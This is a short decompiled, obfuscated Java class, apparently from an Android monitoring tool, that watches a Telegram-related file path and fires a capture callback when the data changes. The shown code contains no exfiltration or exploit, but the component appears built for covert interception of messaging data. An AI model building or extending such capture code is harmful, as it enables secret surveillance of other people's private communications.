package com.vvt.capture.telegram.b;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.capture.telegram.d;

public class a
  implements e, com.vvt.n.a.a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private i c;
  private com.vvt.n.a.b d;
  private boolean e;
  private String f;
  private String g;
  
  public a(com.vvt.n.a.b paramb, String paramString1, String paramString2)
  {
    this.d = paramb;
    this.f = paramString1;
    this.g = paramString2;
    this.e = false;
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (!bool)
    {
      bool = true;
      this.e = bool;
      this.c = parami;
      Object localObject = this.d;
      if (localObject == null) {
        break label66;
      }
      localObject = d.a();
      com.vvt.n.a.b localb = this.d;
      localb.a((String)localObject, this);
    }
    for (;;)
    {
      bool = a;
      if (bool) {}
      return;
      label66:
      bool = b;
      if (!bool) {}
    }
  }
  
  public void a(String paramString)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = d.a();
    if (localObject != null)
    {
      String str1 = this.f;
      String str2 = this.g;
      localObject = d.a((String)localObject, str1, str2);
      bool = com.vvt.ag.b.a((String)localObject);
      if (!bool)
      {
        bool = a;
        if (bool) {}
        localObject = this.c;
        ((i)localObject).a();
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    bool = this.e;
    if (bool)
    {
      this.e = false;
      bool = false;
      this.c = null;
      Object localObject = this.d;
      if (localObject != null)
      {
        localObject = d.a();
        com.vvt.n.a.b localb = this.d;
        localb.a((String)localObject);
      }
    }
    bool = a;
    if (bool) {}
  }
  
  public void c(String paramString) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */